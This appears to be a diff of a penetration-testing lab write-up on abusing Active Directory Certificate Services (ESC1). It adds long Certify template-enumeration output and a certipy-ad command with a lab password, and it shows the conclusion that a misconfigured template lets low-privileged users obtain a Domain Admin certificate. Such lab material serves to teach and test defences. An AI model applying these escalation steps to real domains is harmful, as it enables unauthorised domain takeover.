@@ -21,7 +21,7 @@ Various tools can be used to identify and exploit the ADCS Domain Escalation tec
 -----------------------------------------------------------------------------------------------
 - Certutil (native windows command)
 - Certify.exe (https://github.com/GhostPack/Certify)
-- Certipy.py (https://github.com/ly4k/Certipy)
+- Certipy.py / certipy-ad (https://github.com/ly4k/Certipy)
 - PSPKIAudit.psm1 (https://github.com/GhostPack/PSPKIAudit)
 - PassTheCert.exe (https://github.com/AlmondOffSec/PassTheCert)
 - ...
@@ -33,7 +33,7 @@ Info
 - Low priv domain user: LowPrivUser
 
 =======================================================================================================================================
-PoC - Step 1 - ADCS enumeration using a low privileged domain user and the native windows command 'Certutil' + the C# tool 'Certify.exe'
+PoC - Step 1 - ADCS enumeration using a low privileged domain user and multiple tools (certutil, certify.exe, certipy)
 =======================================================================================================================================
 
 ---------------------------------------------------------------------------------------------------------------------------------------
@@ -270,8 +270,386 @@ C:\temp> Packed_Certify.exe cas /domain:company.work /ldapserver:dc1.company.wor
         Administrator
 
 
+Command to find all enabled certificate templates
+--------------------------------------------------
+
+C:\temp> Packed_Certify.exe find
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=company,DC=work'
+
+[*] Listing info about the Enterprise CA 'company-DC1-CA'
+
+    Enterprise CA Name            : company-DC1-CA
+    DNS Hostname                  : DC1.company.work
+    FullName                      : DC1.company.work\company-DC1-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=company-DC1-CA, DC=company, DC=work
+    Cert Thumbprint               : 0C1E0B8229ADECADCD4699ADD8637E1710ED1737
+    Cert Serial                   : 338189B187A8C2AF4F6B294136FA3B38
+    Cert Start Date               : 5/30/2023 12:06:51 AM
+    Cert End Date                 : 5/30/2028 12:16:51 AM
+    Cert Chain                    : CN=company-DC1-CA,DC=company,DC=work
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799
+914435-512
+      Allow  ManageCA, ManageCertificates               COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799
+914435-519
+    Enrollment Agent Restrictions : None
+
+[*] Available Certificates Templates :
+
+    CA Name                               : DC1.company.work\company-DC1-CA
+    Template Name                         : User
+    Schema Version                        : 1
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Domain Users          S-1-5-21-844310393-2305947092-3799914435-513
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+      Object Control Permissions
+        Owner                       : COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteOwner Principals       : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteDacl Principals        : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteProperty Principals    : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+
+    CA Name                               : DC1.company.work\company-DC1-CA
+    Template Name                         : ClientAuth
+    Schema Version                        : 1
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
+    mspki-enrollment-flag                 : AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Domain Users          S-1-5-21-844310393-2305947092-3799914435-513
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+      Object Control Permissions
+        Owner                       : COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteOwner Principals       : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteDacl Principals        : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteProperty Principals    : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+
+    CA Name                               : DC1.company.work\company-DC1-CA
+    Template Name                         : EFS
+    Schema Version                        : 1
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Encrypting File System
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Domain Users          S-1-5-21-844310393-2305947092-3799914435-513
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+      Object Control Permissions
+        Owner                       : COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteOwner Principals       : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteDacl Principals        : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteProperty Principals    : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+
+    CA Name                               : DC1.company.work\company-DC1-CA
+    Template Name                         : Administrator
+    Schema Version                        : 1
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Microsoft Trust List Signing, Secure Email
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+      Object Control Permissions
+        Owner                       : COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteOwner Principals       : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteDacl Principals        : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteProperty Principals    : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+
+    CA Name                               : DC1.company.work\company-DC1-CA
+    Template Name                         : EFSRecovery
+    Schema Version                        : 1
+    Validity Period                       : 5 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : File Recovery
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+      Object Control Permissions
+        Owner                       : COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteOwner Principals       : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteDacl Principals        : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteProperty Principals    : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+
+    CA Name                               : DC1.company.work\company-DC1-CA
+    Template Name                         : Machine
+    Schema Version                        : 1
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
+    mspki-enrollment-flag                 : AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Server Authentication
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Domain Computers      S-1-5-21-844310393-2305947092-3799914435-515
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+      Object Control Permissions
+        Owner                       : COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteOwner Principals       : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteDacl Principals        : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteProperty Principals    : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+
+    CA Name                               : DC1.company.work\company-DC1-CA
+    Template Name                         : DomainController
+    Schema Version                        : 1
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DIRECTORY_GUID, SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Server Authentication
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Domain Controllers    S-1-5-21-844310393-2305947092-3799914435-516
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+                                      COMPANY\Enterprise Read-only Domain ControllersS-1-5-21-844310393-2305947092-3799914435-498
+                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
+      Object Control Permissions
+        Owner                       : COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteOwner Principals       : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteDacl Principals        : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteProperty Principals    : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+
+    CA Name                               : DC1.company.work\company-DC1-CA
+    Template Name                         : WebServer
+    Schema Version                        : 1
+    Validity Period                       : 2 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : NONE
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Server Authentication
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+      Object Control Permissions
+        Owner                       : COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteOwner Principals       : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteDacl Principals        : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteProperty Principals    : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+
+    CA Name                               : DC1.company.work\company-DC1-CA
+    Template Name                         : SubCA
+    Schema Version                        : 1
+    Validity Period                       : 5 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : NONE
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : <null>
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+      Object Control Permissions
+        Owner                       : COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteOwner Principals       : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteDacl Principals        : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteProperty Principals    : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+
+    CA Name                               : DC1.company.work\company-DC1-CA
+    Template Name                         : DomainControllerAuthentication
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS
+    mspki-enrollment-flag                 : AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Server Authentication, Smart Card Logon
+    mspki-certificate-application-policy  : Client Authentication, Server Authentication, Smart Card Logon
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Domain Controllers    S-1-5-21-844310393-2305947092-3799914435-516
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+                                      COMPANY\Enterprise Read-only Domain ControllersS-1-5-21-844310393-2305947092-3799914435-498
+                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
+      Object Control Permissions
+        Owner                       : COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteOwner Principals       : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteDacl Principals        : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteProperty Principals    : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+
+    CA Name                               : DC1.company.work\company-DC1-CA
+    Template Name                         : DirectoryEmailReplication
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DIRECTORY_GUID, SUBJECT_ALT_REQUIRE_DNS
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Directory Service Email Replication
+    mspki-certificate-application-policy  : Directory Service Email Replication
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Domain Controllers    S-1-5-21-844310393-2305947092-3799914435-516
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+                                      COMPANY\Enterprise Read-only Domain ControllersS-1-5-21-844310393-2305947092-3799914435-498
+                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
+      Object Control Permissions
+        Owner                       : COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteOwner Principals       : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteDacl Principals        : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteProperty Principals    : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+
+    CA Name                               : DC1.company.work\company-DC1-CA
+    Template Name                         : KerberosAuthentication
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DOMAIN_DNS, SUBJECT_ALT_REQUIRE_DNS
+    mspki-enrollment-flag                 : AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, KDC Authentication, Server Authentication, Smart Card Logon
+    mspki-certificate-application-policy  : Client Authentication, KDC Authentication, Server Authentication, Smart Card Logon
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Domain Controllers    S-1-5-21-844310393-2305947092-3799914435-516
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+                                      COMPANY\Enterprise Read-only Domain ControllersS-1-5-21-844310393-2305947092-37999
+14435-498
+                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
+      Object Control Permissions
+        Owner                       : COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteOwner Principals       : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteDacl Principals        : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteProperty Principals    : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+
+    CA Name                               : DC1.company.work\company-DC1-CA
+    Template Name                         : User_template
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, KDC Authentication, Secure Email, Smart Card Logon
+    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, KDC Authentication, Secure Email, Smart Card Logon
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Domain Users          S-1-5-21-844310393-2305947092-3799914435-513
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+      Object Control Permissions
+        Owner                       : COMPANY\Administrator         S-1-5-21-844310393-2305947092-3799914435-500
+        WriteOwner Principals       : COMPANY\Administrator         S-1-5-21-844310393-2305947092-3799914435-500
+                                      COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteDacl Principals        : COMPANY\Administrator         S-1-5-21-844310393-2305947092-3799914435-500
+                                      COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+        WriteProperty Principals    : COMPANY\Administrator         S-1-5-21-844310393-2305947092-3799914435-500
+                                      COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
+                                      COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
+
+Certify completed in 00:00:00.4686279
+
+
+---------------------------------------------------------------------------------------------------------------------------------------
+1.3 ADCS enumeration with the tool "Certipy.py" (which is named "certipy-ad" in Kali)
+---------------------------------------------------------------------------------------------------------------------------------------
+
+Command to enumerate the ADCS
+-------------------------------
+jeff@kali:~$ certipy-ad find -u LowPrivUser@company.work -p 'SuperGenialPwd' -target 192.168.1.167
+
+
 =======================================================================================================================================
-PoC 2 - Step 2 - Find vulnerable/abusable certificate templates (ESC1) with the C# tool 'Certify.exe'
+PoC 2 - Step 2 - Find vulnerable certificate templates (ESC1) with the C# tool 'Certify.exe'
 =======================================================================================================================================
 
 Command to find vulnerable/abusable certificate templates using default low-privileged groups
@@ -350,8 +728,8 @@ Certify completed in 00:00:00.1708239
 
 => Conclusion: The "User_template" is prone to the domain privesc vulnerability "ESC1"
 --------------------------------------------------------------------------------------
-The group "COMPANY\Domain Users" can enroll in the template "User_template" which can be used for client authentication and has ENROLLEE_SUPPLIES_SUBJECT set.
-This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA).
+The group "COMPANY\Domain Users" can enroll in the template "User_template" which can be used for "client authentication" and has "ENROLLEE_SUPPLIES_SUBJECT" set.
+This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name such as a Domain Admin account.
 
 
 =======================================================================================================================================
@@ -366,9 +744,7 @@ jeff@kali:~$ sudo apt-get install certipy-ad
 Reading package lists... Done
 Building dependency tree... Done
 Reading state information... Done
-<SNIP>                                                                                       
-Setting up certipy-ad (4.0.0-0kali1) ...
-Processing triggers for kali-menu (2021.2.1) ...
+<SNIP>
 
 
 jeff@kali:~$ certipy-ad
@@ -426,9 +802,9 @@ Certipy v4.3.0 - by Oliver Lyak (ly4k)
 
 NOTES
 ------
-The attack worked and we now have a PFX certificate valid for the Domain Admin account "Company\Administrator".
-However when I tried to use the PFX but I have a problem of synchronization between my kali linux machin and my LAB Domain Controller 'dc1.company.work'.
-So I used the tool "PassTheCert.exe" to validate that the PFX certificate is indeed valid :-)
+The attack worked and we obtained a PFX certificate for the Domain Admin account "Company\Administrator".
+However when I tried to use the PFX certifcate I had a problem of time synchronization between my kali linux machine and my LAB Domain Controller 'dc1.company.work'.
+So I used the tool "PassTheCert.exe" to validate that the PFX certificate was valid :-)
    
 PS C:\Users\j-cana\Documents\Tools-Pentest> .\Packed_PassTheCert.exe --cert-path ./administrator.pfx --whoami --target DC=company,DC=work --server 192.168.1.167
 Querying LDAP As : u:COMPANY\Administrator
